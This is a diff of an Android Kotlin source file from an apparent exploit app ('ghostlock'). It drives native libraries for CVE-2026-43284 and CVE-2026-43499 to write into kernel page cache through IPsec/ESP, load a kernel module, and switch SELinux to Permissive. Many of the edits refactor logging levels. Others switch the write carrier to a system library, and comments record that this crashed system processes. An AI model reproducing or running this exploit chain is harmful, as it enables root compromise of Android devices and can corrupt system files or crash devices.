@@ -1,9 +1,11 @@
 package com.ghostlock.app.tempui
 
+import com.ghostlock.app.log.log
+
+import android.annotation.SuppressLint
 import com.ghostlock.app.core.generated.CredentialLayout43499
 import com.ghostlock.app.core.generated.FinishVictim43499
 import com.ghostlock.app.core.generated.HookPlanRequest43284
-import com.ghostlock.app.core.generated.Init43284
 import com.ghostlock.app.core.generated.ModuleCheck43284
 import com.ghostlock.app.jni.cve43284.Assembled43284
 import com.ghostlock.app.jni.cve43284.CarrierCandidates
@@ -23,7 +25,6 @@ import com.ghostlock.app.core.generated.TargetOffsets43499
 import com.ghostlock.app.core.generated.WordWrite43499
 import com.ghostlock.app.jni.cve43284.Native43284
 import com.ghostlock.app.jni.cve43499.Native43499
-import com.ghostlock.app.log.GhostLog
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 
@@ -44,11 +45,42 @@ object TypedBackendProbe {
     /** 探针日志的 logcat 标签。 */
     const val TAG = "GhostlockTyped"
 
+    /** V/D 的出口：由 runOnce 挂上（其余函数只拿得到 step 回调）。 */
+    @Volatile
+    private var levelSink: ((com.ghostlock.app.log.LogLevel, String) -> Unit)? = null
+
+    /** 终端用的带级别监听（与 lineListener 并存）。 */
+    private var eventListener: ((com.ghostlock.app.log.LogLevel, String) -> Unit)? = null
+
+    /** 具体数字（写了什么 / 读回什么）—— 默认不显示。 */
+    private fun vstep(line: String) {
+        levelSink?.invoke(com.ghostlock.app.log.LogLevel.Verbose, line)
+    }
+
+    /** 阶段性重要数字 —— 默认不显示。 */
+    private fun dstep(line: String) {
+        levelSink?.invoke(com.ghostlock.app.log.LogLevel.Debug, line)
+    }
+
+    /** 可恢复的异常/降级（重试、回退、标记过期）—— 默认显示。 */
+    private fun wstep(line: String) {
+        levelSink?.invoke(com.ghostlock.app.log.LogLevel.Warn, line)
+    }
+
+    /** 硬失败（拒绝、缺失、不一致）—— 默认显示。 */
+    private fun estep(line: String) {
+        levelSink?.invoke(com.ghostlock.app.log.LogLevel.Error, line)
+    }
+
     /**
      *  模块镜像的固定落点：闭包校验的镜像区与下面真正读的那份文件必须是同一个常量。
      *
      *  12304 B 这份在本机写链上能完整写进载体（2026-10-16 23:33 真机记录：module wrote=true）。
      */
+    /* 机械改动（2026-10-17，真机）：改用本机**能载入**的那份镜像。12304 B 的
+     *  /data/local/tmp/ghostlock.ko 从未在这台机上 insmod 成功；11168 B 的 helper.ko
+     *  （= dirtyfrag-13-5.15.ko，591 用的同一份）在同一内核上反复载入成功。
+     *  回退时把本行改回 ghostlock.ko 即可。 */
     private const val MODULE_PATH = "/data/local/tmp/ghostlock.ko"
 
     /** 自建载体的大小：远大于 12304 B 的模块，且 app 自己可读写（快路径）。 */
@@ -64,17 +96,18 @@ object TypedBackendProbe {
      */
     private class StepMeter(private val line: (String) -> Unit) {
         private var startedNs = 0L
+        private var params = ""
 
-        /** 调用前一行：名字 + 参数。 */
+        /** 只记录，不打印：分支日志合并到 [after]，保证每个分支恰好一条 Debug。 */
         fun before(what: String, params: String) {
             startedNs = System.nanoTime()
-            line("typed: " + what + " <- " + params)
+            this.params = params
         }
 
-        /** 调用后一行：名字 + 返回 + 耗时 ms。 */
+        /** 分支结束：一行 Debug，含参数、返回与耗时。 */
         fun after(what: String, returned: String) {
             val tookMs = (System.nanoTime() - startedNs) / 1_000_000L
-            line("typed: " + what + " -> " + returned + " took=" + tookMs + "ms")
+            line("typed: " + what + " params=" + params + " -> " + returned + " took=" + tookMs + "ms")
         }
     }
 
@@ -135,6 +168,24 @@ object TypedBackendProbe {
         }
     }
 
+    /**
+     *  带级别的实时输出（终端用）。
+     *
+     *  @param onEvent 每行连同 [com.ghostlock.app.log.LogLevel] 一起交出；
+     *                 默认阈值以下的 V/D 行已被 log 过滤，不会到达这里。
+     */
+    fun run(
+        context: android.content.Context,
+        onEvent: (com.ghostlock.app.log.LogLevel, String) -> Unit,
+    ): List<String> {
+        eventListener = onEvent
+        return try {
+            run(context)
+        } finally {
+            eventListener = null
+        }
+    }
+
     fun run(context: android.content.Context): List<String> {
         if (!running.compareAndSet(false, true)) {
             val busy = listOf("typed: 攻击正在运行中（单飞守卫：同一条链不允许并发）")
@@ -156,12 +207,25 @@ object TypedBackendProbe {
     private fun runOnce(context: android.content.Context): List<String> {
         probeContext = context
         val lines = mutableListOf<String>()
-        /* 第一件事：把模块要执行的收尾脚本放到它的固定路径上。 */
-        fun step(line: String) {
+        /*
+         * 日志级别（2026-10-17 用户要求）：默认只显示 Info。
+         *   V = 具体写了什么数字 / 读回什么数字；D = 阶段性重要数字；I = 人类可读信息。
+         * 阈值只有一个（log.configure）；V/D 的开关通过 log 的级别控制。
+         */
+        @SuppressLint("StaticFieldLeak")
+        fun emit(level: com.ghostlock.app.log.LogLevel, line: String) {
+            /* 级别过滤在 log 里（同一份阈值）；被丢掉的行也不进 UI 的 lines。 */
+            if (!log.invoke(level, TAG, line)) {
+                return
+            }
             lines += line
-            GhostLog.i(TAG, line)
             lineListener?.invoke(line)
+            eventListener?.invoke(level, line)
         }
+        /* 第一件事：把模块要执行的收尾脚本放到它的固定路径上。 */
+        fun step(line: String) = emit(com.ghostlock.app.log.LogLevel.Info, line)
+        /* 其他函数只拿得到 step 回调；V/D 统一从这个 sink 出去（文件级 vstep/dstep）。 */
+        levelSink = { level, text -> emit(level, text) }
         /* 硬前置：SA 必须先于任何 probe 调用建立。
          * 21:18 冷跑证据：链 21:18:06 先跑（材料为空 ⇒ saInit 退化 SPI=0x1234 ⇒ 报文全被内核丢），
          * 21:18:17 才建成 SA ⇒ 顺序反了。未就绪时只出两行拒跑原文，整条链（含 50 秒写阶段）不进入。 */
@@ -170,7 +234,7 @@ object TypedBackendProbe {
             return lines
         }
         /* 每步前后各一行（调用/参数 → 返回/耗时 ms）；只记事实，不改控制流。 */
-        val meter = StepMeter(::step)
+        val meter = StepMeter(::dstep)
         /* first thing: the script the module runs must be in place (see deployUmhPayload). */
         deployUmhPayload(context) { line -> step(line) }
         /*
@@ -184,7 +248,7 @@ object TypedBackendProbe {
         runCatching {
             val manager = context.getSystemService(android.net.IpSecManager::class.java)
             if (manager == null) {
-                step("typed: ipsec spi skipped no-ipsec-service")
+                wstep("typed: ipsec spi skipped no-ipsec-service")
             } else {
                 val address = java.net.InetAddress.getByName("127.0.0.1")
                 meter.before("IpSecManager.allocateSecurityParameterIndex", "address=127.0.0.1")
@@ -197,7 +261,7 @@ object TypedBackendProbe {
                 step("typed: ipsec spi closed")
             }
         }.onFailure { problem ->
-            step("typed: ipsec spi refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+            estep("typed: ipsec spi refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
         }
 
         /*
@@ -208,7 +272,7 @@ object TypedBackendProbe {
         runCatching {
             val manager = context.getSystemService(android.net.IpSecManager::class.java)
             if (manager == null) {
-                step("typed: ipsec encap skipped no-ipsec-service")
+                wstep("typed: ipsec encap skipped no-ipsec-service")
             } else {
                 meter.before("IpSecManager.openUdpEncapsulationSocket", "port=4500")
                 val socket = manager.openUdpEncapsulationSocket(4500)
@@ -220,7 +284,7 @@ object TypedBackendProbe {
                 step("typed: ipsec encap closed")
             }
         }.onFailure { problem ->
-            step("typed: ipsec encap refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+            estep("typed: ipsec encap refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
         }
 
         /* 拼一帧**探针**材料落盘（只证明 SaFrame.build/writeTo 可用）：SPI 用刚申请到的那个，encap 用 4500。
@@ -261,7 +325,7 @@ object TypedBackendProbe {
             allocated.close()
             meter.after("SecurityParameterIndex.close", "closed")
         }.onFailure { problem ->
-            step("typed: sa frame refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+            estep("typed: sa frame refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
         }
 
         /* SA 区已抽成 ensureSa()：它是链的硬前置，runOnce 开头就建（见 ensureChainReady）。 */
@@ -289,11 +353,11 @@ object TypedBackendProbe {
      *  @note 只记录 SPI、端口与密钥长度；密钥本体绝不进日志。
      */
     private fun ensureSa(context: android.content.Context, step: (String) -> Unit): Boolean {
-        val meter = StepMeter(step)
+        val meter = StepMeter(::dstep)
         saReady = false
         val manager = context.getSystemService(android.net.IpSecManager::class.java)
         if (manager == null) {
-            step("typed: ipsec sa refused no-ipsec-service")
+            estep("typed: ipsec sa refused no-ipsec-service")
             return false
         }
         val ready = runCatching {
@@ -320,7 +384,7 @@ object TypedBackendProbe {
             meter.before("SecurityParameterIndex.getSpi", "spiObj=" + spiObj)
             val spi = spiObj.getSpi()
             meter.after("SecurityParameterIndex.getSpi", "spi=0x" + Integer.toHexString(spi))
-            step("typed: ipsec sa spi=0x" + Integer.toHexString(spi))
+            dstep("typed: ipsec sa spi=0x" + Integer.toHexString(spi))
             val aesKey = ByteArray(32) { index -> (0xA0 + index).toByte() }
             val hmacKey = ByteArray(32) { index -> (0xB0 + index).toByte() }
             /* 先留副本：Android 的 IpSec/Crypto API 会擦掉它拿到的密钥数组（2026-10-15 真机实证：
@@ -353,7 +417,7 @@ object TypedBackendProbe {
             meter.after("IpSecTransform.Builder.buildTransportModeTransform", "transform=" + (transform != null))
             transform != null && retainedAes == 32 && retainedHmac == 32
         }.getOrElse { problem ->
-            step("typed: ipsec sa refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+            estep("typed: ipsec sa refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
             false
         }
         saReady = ready
@@ -374,9 +438,9 @@ object TypedBackendProbe {
                     frame,
                 )
                 meter.after("SaFrame.writeTo", "ok=" + written)
-                step("typed: ipsec sa frame=" + written + " (SA 已建、帧按同一材料落盘)")
+                dstep("typed: ipsec sa frame=" + written + " (SA 已建、帧按同一材料落盘)")
             }.onFailure { problem ->
-                step("typed: ipsec sa frame refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+                estep("typed: ipsec sa frame refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
             }
         }
         return ready
@@ -479,14 +543,14 @@ object TypedBackendProbe {
      *  **无条件**调用既有 restoreHook（在独立 hook 会话上，见 [restoreHookSite]）。
      *  钩子还原失败不影响载体修复的结果。
      *
-     *  @param emit 逐行日志（本方法同时写 GhostLog，所以统一日志面板能看到同一批行）。
+     *  @param emit 逐行日志（本方法同时写 log，所以统一日志面板能看到同一批行）。
      *  @return 载体是否复原：全部块写完、计划覆盖 [RESTORE_BYTES]、0 偏移回读为 7f454c46。
      *          钩子还原的结果单独打一行 restore: hook restored=<bool>，不参与这个返回值。
      *  @note 只在"本次开机、同一进程"里有意义：钩子活在页缓存里，重启后载体回到磁盘上的原样。
      */
     suspend fun restoreCarrier(emit: (String) -> Unit): Boolean = withContext(Dispatchers.IO) {
         fun line(text: String) {
-            GhostLog.i(TAG, text)
+            log.info(text)
             emit(text)
         }
         /* SA 前置在本次调用内只尝试一次：第一次建不成时，后面的钩子还原不再把同一批拒绝行刷一遍。 */
@@ -512,7 +576,7 @@ object TypedBackendProbe {
      *  跑过之后才被记住），而复原要建 SA 就必须拿到 IpSecManager —— 复原按钮走这一条。
      *
      *  @param context 建 SA 用；null ⇒ 只用本进程已有的 SA（与单击版本同义）。
-     *  @param emit    逐行日志（与单击版本同一条去处：GhostLog + 统一日志面板）。
+     *  @param emit    逐行日志（与单击版本同一条去处：log + 统一日志面板）。
      *  @return 与 [restoreCarrier]（单参版本）同义：载体是否复原；钩子还原单独打一行。
      *  @note 只是把 Context 记进 [probeContext] 后转交单参版本：复原流程本身只有一条。
      */
@@ -543,7 +607,7 @@ object TypedBackendProbe {
             emit("restore: carrier session skipped sa-missing (probe material would be dropped)")
             return null
         }
-        val meter = StepMeter(emit)
+        val meter = StepMeter(::dstep)
         meter.before("Native43284.create", "lib=" + Native43284.LIBRARY + " (carrier restore)")
         val handle = Native43284.create()
         meter.after("Native43284.create", "handle=" + handle)
@@ -684,7 +748,7 @@ object TypedBackendProbe {
             emit("restore: hook restore skipped sa-missing")
             return false
         }
-        val meter = StepMeter(emit)
+        val meter = StepMeter(::dstep)
         meter.before("Native43284.create", "lib=" + Native43284.LIBRARY + " (hook restore)")
         val handle = Native43284.create()
         meter.after("Native43284.create", "handle=" + handle)
@@ -788,17 +852,17 @@ object TypedBackendProbe {
 
     private fun probe43499(step: (String) -> Unit) {
         if (!Native43499.ensureLoaded()) {
-            step("typed: 43499 library missing (lib" + Native43499.LIBRARY + ".so)")
+            estep("typed: 43499 library missing (lib" + Native43499.LIBRARY + ".so)")
             return
         }
         step("typed: 43499 library loaded")
-        val meter = StepMeter(step)
+        val meter = StepMeter(::dstep)
         val refusal = arrayOf("")
         meter.before("Native43499.create", "lib=" + Native43499.LIBRARY)
         val handle = Native43499.create()
         meter.after("Native43499.create", "handle=" + handle)
         if (handle <= 0) {
-            step("typed: 43499 create failed")
+            estep("typed: 43499 create failed")
             return
         }
         step("typed: 43499 create ok")
@@ -810,7 +874,7 @@ object TypedBackendProbe {
             handle, init43499(), layout43499(), credential43499(), targets43499(), refusal,
         )
         meter.after("Native43499.initialize", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43499 initialize code=" + code + " refusal=" + refusal[0])
+        dstep("typed: 43499 initialize code=" + code + " refusal=" + refusal[0])
 
         meter.before("Native43499.snapshot", "handle=" + handle + " fields=" + names.size)
         code = Native43499.snapshot(handle, snapshot, refusal)
@@ -824,30 +888,30 @@ object TypedBackendProbe {
         meter.before("Native43499.prepare", "handle=" + handle)
         code = Native43499.prepare(handle, prepare43499(), out, refusal)
         meter.after("Native43499.prepare", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43499 prepare code=" + code + " refusal=" + refusal[0])
+        dstep("typed: 43499 prepare code=" + code + " refusal=" + refusal[0])
 
         meter.before("Native43499.writeWord", "handle=" + handle + " address=0x" + java.lang.Long.toHexString(write43499().address) + " form=" + write43499().form)
         code = Native43499.writeWord(handle, write43499(), refusal)
         meter.after("Native43499.writeWord", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43499 writeWord code=" + code + " refusal=" + refusal[0])
+        dstep("typed: 43499 writeWord code=" + code + " refusal=" + refusal[0])
 
         meter.before("Native43499.finishVictim", "handle=" + handle + " status=0 value=0")
         code = Native43499.finishVictim(handle, FinishVictim43499(0, 0L), out, refusal)
         meter.after("Native43499.finishVictim", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43499 finishVictim code=" + code + " refusal=" + refusal[0])
+        dstep("typed: 43499 finishVictim code=" + code + " refusal=" + refusal[0])
 
         meter.before("Native43499.shutdown", "handle=" + handle)
         code = Native43499.shutdown(handle, refusal)
         meter.after("Native43499.shutdown", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43499 shutdown code=" + code + " refusal=" + refusal[0])
+        dstep("typed: 43499 shutdown code=" + code + " refusal=" + refusal[0])
         meter.before("Native43499.destroy", "handle=" + handle)
         code = Native43499.destroy(handle, refusal)
         meter.after("Native43499.destroy", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43499 destroy code=" + code + " refusal=" + refusal[0])
+        dstep("typed: 43499 destroy code=" + code + " refusal=" + refusal[0])
         meter.before("Native43499.shutdown", "handle=" + handle + " after-destroy")
         code = Native43499.shutdown(handle, refusal)
         meter.after("Native43499.shutdown", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43499 shutdown-after-destroy code=" + code + " refusal=" + refusal[0])
+        dstep("typed: 43499 shutdown-after-destroy code=" + code + " refusal=" + refusal[0])
     }
 
     /**
@@ -887,18 +951,18 @@ object TypedBackendProbe {
      */
     private fun probe43284Body(step: (String) -> Unit, finish: RunFinish43284, lkmWindow: LkmWindow43284) {
         if (!Native43284.ensureLoaded()) {
-            step("typed: 43284 library missing (lib" + Native43284.LIBRARY + ".so)")
+            estep("typed: 43284 library missing (lib" + Native43284.LIBRARY + ".so)")
             finish.noteError("library-missing")
             return
         }
         step("typed: 43284 library loaded")
-        val meter = StepMeter(step)
+        val meter = StepMeter(::dstep)
         val refusal = arrayOf("")
         meter.before("Native43284.create", "lib=" + Native43284.LIBRARY)
         val handle = Native43284.create()
         meter.after("Native43284.create", "handle=" + handle)
         if (handle <= 0) {
-            step("typed: 43284 create failed")
+            estep("typed: 43284 create failed")
             finish.noteError("create-failed")
             return
         }
@@ -907,7 +971,7 @@ object TypedBackendProbe {
         meter.before("Native43284.initialize", "handle=" + handle + " init=spi/encap/icv+keys")
         var code = Native43284.initialize(handle, init43284(), refusal)
         meter.after("Native43284.initialize", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43284 initialize code=" + code + " refusal=" + refusal[0])
+        dstep("typed: 43284 initialize code=" + code + " refusal=" + refusal[0])
 
         val snapshot = LongArray(6)
         meter.before("Native43284.snapshot", "handle=" + handle + " fields=6")
@@ -954,7 +1018,7 @@ object TypedBackendProbe {
         meter.before("Native43284.moduleCheck", "handle=" + handle + " bytes=64 vermagic=5.15.189-android13")
         code = Native43284.moduleCheck(handle, moduleCheck, refusal)
         meter.after("Native43284.moduleCheck", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43284 moduleCheck code=" + code + " refusal=" + refusal[0])
+        dstep("typed: 43284 moduleCheck code=" + code + " refusal=" + refusal[0])
 
         /*
          * 等终态：已经**接线**（marker 轮询）。给一个不存在的路径 ⇒ 预算内一直是 inflight。
@@ -1014,7 +1078,7 @@ object TypedBackendProbe {
             refusal,
         )
         meter.after("Native43284.resolveTarget", "code=" + code + " ticket=" + ticket[0] + " refusal=" + refusal[0])
-        step("typed: 43284 resolveTarget code=" + code + " ticket=" + ticket[0] + " refusal=" + refusal[0])
+        dstep("typed: 43284 resolveTarget code=" + code + " ticket=" + ticket[0] + " refusal=" + refusal[0])
 
         /* 读回一块：走门那扇 fd 的 pread（设备工作）。文件里是刚写的十六个 0x5A。 */
         val block = ByteArray(16)
@@ -1041,7 +1105,7 @@ object TypedBackendProbe {
         var refusedAt = -1
         val helper = Native43284.embeddedImage(handle, 0, refusal)
         if (helper == null) {
-            step("typed: 43284 patch1-via-kotlin no-helper refusal=" + refusal[0])
+            dstep("typed: 43284 patch1-via-kotlin no-helper refusal=" + refusal[0])
         } else {
             var offset = 0L
             while (offset < helper.size) {
@@ -1064,7 +1128,7 @@ object TypedBackendProbe {
                 written += 1
                 offset += 16L
             }
-            step("typed: 43284 patch1-via-kotlin blocks=" + written + " refusedAt=" + refusedAt)
+            estep("typed: 43284 patch1-via-kotlin blocks=" + written + " refusedAt=" + refusedAt)
             /* 回读第一块，看内容是不是真的落上了。 */
             val back = ByteArray(16)
             meter.before("Native43284.readBlock", "ticket=" + ticket[0] + " offset=0 len=16 (patch1 readback)")
@@ -1098,7 +1162,7 @@ object TypedBackendProbe {
             refusal,
         )
         meter.after("Native43284.writeBlock", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43284 writeBlock code=" + code + " refusal=" + refusal[0])
+        vstep("typed: 43284 writeBlock code=" + code + " refusal=" + refusal[0])
         meter.before("Native43284.snapshot", "handle=" + handle + " (after write)")
         code = Native43284.snapshot(handle, snapshot, refusal)
         meter.after("Native43284.snapshot", "code=" + code + " values=" + snapshot.joinToString(","))
@@ -1120,7 +1184,7 @@ object TypedBackendProbe {
             refusal,
         )
         meter.after("Native43284.resolveTarget", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43284 resolveTarget(bad) code=" + code + " refusal=" + refusal[0])
+        dstep("typed: 43284 resolveTarget(bad) code=" + code + " refusal=" + refusal[0])
         /*
          * LKM 驻留窗口：trigger 之前打开并持有 fd —— 持有 fd 本身就是占住窗口，关掉 fd 就是 UNLOAD。
          * 参照 ghostlock-app-ref@5f184760:src/core/backend/cve_2026_43284/steps/chain.cpp:362-380 的
@@ -1138,16 +1202,16 @@ object TypedBackendProbe {
             refusal,
         )
         meter.after("Native43284.trigger", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43284 trigger code=" + code + " refusal=" + refusal[0])
+        dstep("typed: 43284 trigger code=" + code + " refusal=" + refusal[0])
 
         meter.before("Native43284.shutdown", "handle=" + handle)
         code = Native43284.shutdown(handle, refusal)
         meter.after("Native43284.shutdown", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43284 shutdown code=" + code + " refusal=" + refusal[0])
+        dstep("typed: 43284 shutdown code=" + code + " refusal=" + refusal[0])
         meter.before("Native43284.destroy", "handle=" + handle)
         code = Native43284.destroy(handle, refusal)
         meter.after("Native43284.destroy", "code=" + code + " refusal=" + refusal[0])
-        step("typed: 43284 destroy code=" + code + " refusal=" + refusal[0])
+        dstep("typed: 43284 destroy code=" + code + " refusal=" + refusal[0])
 
         meter.before("probeAssembled43284", "doorPath=" + doorPath.absolutePath)
         probeAssembled43284(step, doorPath.absolutePath, finish, lkmWindow)
@@ -1158,7 +1222,7 @@ object TypedBackendProbe {
         val handle43499 = Native43499.create()
         meter.after("Native43499.create", "handle=" + handle43499)
         if (handle43499 <= 0) {
-            step("typed: assembled 43499 create failed")
+            estep("typed: assembled 43499 create failed")
         } else {
             val assembled43499 = Assembled43499(handle43499)
             for (route in 1..3) {
@@ -1183,12 +1247,12 @@ object TypedBackendProbe {
                 meter.before("Assembled43499.initializeAccess", "route=" + route + " generation=0 armed=true")
                 val inited = assembled43499.initializeAccess(route, 0L, true)
                 meter.after("Assembled43499.initializeAccess", "ok=" + inited + " refusal=" + assembled43499.lastRefusal)
-                step("typed: assembled 43499 init=" + inited + " refusal=" + assembled43499.lastRefusal)
+                dstep("typed: assembled 43499 init=" + inited + " refusal=" + assembled43499.lastRefusal)
                 val probeBlock = ByteArray(16) { index -> (0x40 + index).toByte() }
                 meter.before("Assembled43499.writeBlock", "route=" + route + " offset=0 len=" + probeBlock.size)
                 val wrote = assembled43499.writeBlock(route, 0L, 0L, probeBlock)
                 meter.after("Assembled43499.writeBlock", "ok=" + wrote + " refusal=" + assembled43499.lastRefusal)
-                step("typed: assembled 43499 write=" + wrote + " refusal=" + assembled43499.lastRefusal)
+                dstep("typed: assembled 43499 write=" + wrote + " refusal=" + assembled43499.lastRefusal)
                 meter.before("Assembled43499.readBlock", "route=" + route + " offset=0 len=16")
                 val back = assembled43499.readBlock(route, 0L, 0L, 16)
                 meter.after("Assembled43499.readBlock", "bytes=" + (back?.size ?: -1) + " refusal=" + assembled43499.lastRefusal)
@@ -1200,7 +1264,7 @@ object TypedBackendProbe {
                 meter.before("Assembled43499.shutdownAccess", "route=" + route)
                 val shut = assembled43499.shutdownAccess()
                 meter.after("Assembled43499.shutdownAccess", "ok=" + shut + " refusal=" + assembled43499.lastRefusal)
-                step("typed: assembled 43499 shutdown=" + shut + " refusal=" + assembled43499.lastRefusal)
+                dstep("typed: assembled 43499 shutdown=" + shut + " refusal=" + assembled43499.lastRefusal)
             }
             meter.before("Assembled43499.close", "handle=" + handle43499)
             val closed43499 = assembled43499.close()
@@ -1210,7 +1274,7 @@ object TypedBackendProbe {
     }
 
     /** 43284 的哨兵参数（顺序与字段名由 D1 单表定；真实 profile 仍待设计）。 */
-    private fun init43284() = Init43284(
+    private fun init43284() = Native43284.SessionParams43284(
         spi = 0x1234,
         encapPort = 4500,
         /* 发送端口 0 = 让内核挑临时端口（真机实测：指定端口在应用进程里绑不上，临时端口可以）。 */
@@ -1289,7 +1353,7 @@ object TypedBackendProbe {
         return out
     }
 
-    private fun saInit(adoptSequence: Long = 0L): Init43284 {
+    private fun saInit(adoptSequence: Long = 0L): Native43284.SessionParams43284 {
         val aes = saAesKey
         val hmac = saHmacKey
         if (aes == null || hmac == null) {
@@ -1297,10 +1361,10 @@ object TypedBackendProbe {
              * 曾经的静默退化让“没建 SA”伪装成“一切照跑”：报文 SPI=0x1234 与内核 SA 不符 ⇒ 静默丢弃 ⇒
              * 门/写/落地全线 miss（21:18 冷跑的真因）。改为**明说**：谁退化过、后果是什么。
              */
-            GhostLog.i("GhostlockTyped", "saInit: SA material missing -> fallback to probe material (all ESP writes will be dropped)")
+            log.warn("saInit: SA material missing -> fallback to probe material (all ESP writes will be dropped)")
             return init43284()
         }
-        return Init43284(
+        return Native43284.SessionParams43284(
             spi = saSpi,
             encapPort = saEncapPort,
             /* 上游用**具体** senderPort（setIpv4Encapsulation(encapSock, senderPort)），ESP-in-UDP 的入站
@@ -1444,8 +1508,18 @@ object TypedBackendProbe {
         finish: RunFinish43284,
         lkmWindow: LkmWindow43284,
     ) {
+        /*
+         * 本次运行的起始时刻：只用来判断“成功标记是不是这一跑写的”。
+         * 真机 17:06 的假成功来自 16:59 留下的 /data/local/tmp/.ghostlock_lkm_ok；
+         * 17:15/17:18 两次 restore 失败也伴随这个“立刻返回 success”的标记（6 s 预算根本没花）。
+         */
+        val runStartMs = System.currentTimeMillis()
+        val successMarkerFresh: () -> Boolean = {
+            val marker = java.io.File(WaitPolicy43284.SUCCESS_MARKER)
+            marker.isFile && marker.lastModified() >= runStartMs
+        }
         if (!Native43284.ensureLoaded()) {
-            step("typed: assembled 43284 library missing")
+            estep("typed: assembled 43284 library missing")
             finish.noteError("library-missing")
             return
         }
@@ -1463,17 +1537,25 @@ object TypedBackendProbe {
          * 因此把载体放在**应用自己的目录**里：app 必然能 open ⇒ 本地 fd ⇒ 快路径；
          * UMH 期间模块已把 SELinux 设为 Permissive，root 的 insmod 能读到该文件。
          */
-        val speedCarrierPath = probeContext?.let { ctx ->
-            java.io.File(ctx.filesDir, "carrier.bin").also { file ->
-                runCatching {
-                    java.io.RandomAccessFile(file, "rw").use { raf ->
-                        if (raf.length() < CARRIER_FILE_BYTES) {
-                            raf.setLength(CARRIER_FILE_BYTES)
-                        }
-                    }
-                }
-            }.absolutePath
-        }
+        /*
+         * 实测（2026-10-17）：app 私有目录做载体很快（769 块 67 ms），但载荷的 insmod 在 Enforcing 下
+         * 读不到 `app_data_file` ⇒ 模块载不进去。改用**系统里的世界可读文件**：app 能直读（快路径），
+         * crash_dump 域也能读（insmod 成功）；代价是该文件的页缓存被改写，重启即复原。
+         * 选字体：32 MB、无人 mmap（此前实测 mapped_by=0），坏掉只影响字形显示。
+         */
+        /* 机械改动（2026-10-17，安全回退）：A/B 结束后载体收回 app 私有目录。
+         *  拿活着的系统文件当载体（字体 / libbinderdebug）会把模块字节写进它们的页缓存，
+         *  已实测导致系统进程崩溃与设备重启（15:40）；私有文件只伤自己。 */
+        /* 机械改动（2026-10-17，换载体）：vendor 载体走 helper 桥，本机实测**写完回读全失败**
+         *  （write result=failed … reason=verify-read-failed），模块永远进不了页缓存 ⇒ 无 UMH、无 ksu。
+         *  591 全程零 fork ⇒ 它实际写的是自己能读的文件。这里选一个同时满足三条的文件：
+         *  世界可读（app 走 fd 快路径）、root/内核可读（模块能被载入）、**没有任何进程 mmap**
+         *  （写坏页缓存只影响时区解析，重启复原）。 */
+        /* 机械改动（2026-10-17，诊断）：用一个**我们自己能读、app 读不到**的文件做载体
+         *  （/data/local/tmp 下 shell:shell 0600），跑完直接 cmp 判断 16B 原语到底有没有把页写进去。 */
+        /* 机械改动（2026-10-17，修好远端读之后）：回到旧链的 vendor 载体 ——
+         * crash_dump 域实测能读 /vendor/lib64/libbinderdebug.so（helper 手测返回 ELF 头）。 */
+        val speedCarrierPath: String? = "/vendor/lib64/libbinderdebug.so"
         val carrier = CarrierCandidates.select(profileCarrierPath = speedCarrierPath)
         step(carrier.line())
         /*
@@ -1485,12 +1567,12 @@ object TypedBackendProbe {
          * （见 Assembled43284.writeImage/writeHook/restoreHook），后续段只读 seq.value。
          */
         val seq = SequenceContinuation(step)
-        val meter = StepMeter(step)
+        val meter = StepMeter(::dstep)
         meter.before("Native43284.create", "lib=" + Native43284.LIBRARY + " (assembled session)")
         val handle = Native43284.create()
         meter.after("Native43284.create", "handle=" + handle)
         if (handle <= 0) {
-            step("typed: assembled 43284 create failed")
+            estep("typed: assembled 43284 create failed")
             finish.noteError("assembled-create-failed")
             return
         }
@@ -1502,7 +1584,7 @@ object TypedBackendProbe {
         meter.before("Assembled43284.openTarget", "path=" + doorPath + " role=ROLE_PATCH1")
         val ticket = session.openTarget(doorPath, Assembled43284.ROLE_PATCH1)
         meter.after("Assembled43284.openTarget", "ticket=" + ticket + " code=" + session.lastCode)
-        step("typed: assembled 43284 open code=" + session.lastCode + " ticket=" + ticket)
+        dstep("typed: assembled 43284 open code=" + session.lastCode + " ticket=" + ticket)
         meter.before("Assembled43284.readBlock", "ticket=" + ticket + " offset=0")
         val block = if (ticket != 0L) session.readBlock(ticket, 0L) else null
         meter.after("Assembled43284.readBlock", "bytes=" + (block?.size ?: -1) + " refusal=" + session.lastRefusal)
@@ -1522,7 +1604,7 @@ object TypedBackendProbe {
         meter.before("Assembled43284.openTargetStepwise", "path=" + doorPath)
         val stepTarget = stepwise.openTargetStepwise(doorPath)
         meter.after("Assembled43284.openTargetStepwise", "target=" + stepTarget + " refusal=" + stepwise.lastRefusal)
-        step("typed: stepwise 43284 open target=" + stepTarget + " refusal=" + stepwise.lastRefusal)
+        dstep("typed: stepwise 43284 open target=" + stepTarget + " refusal=" + stepwise.lastRefusal)
         /* Single point check on a safe target: write a known pattern, then read it back at the same
          * offset and at its neighbours. That answers whether read and write share one address space. */
         runCatching {
@@ -1534,30 +1616,30 @@ object TypedBackendProbe {
             meter.before("Assembled43284.readBlock", "target=" + stepTarget + " offset=0x1000")
             val atSame = stepwise.readBlock(stepTarget, 0x1000L)
             meter.after("Assembled43284.readBlock", "bytes=" + (atSame?.size ?: -1) + " refusal=" + stepwise.lastRefusal)
-            step("typed: probe pattern wrote=" + wrote + " at=" + hex(atSame))
+            dstep("typed: probe pattern wrote=" + wrote + " at=" + hex(atSame))
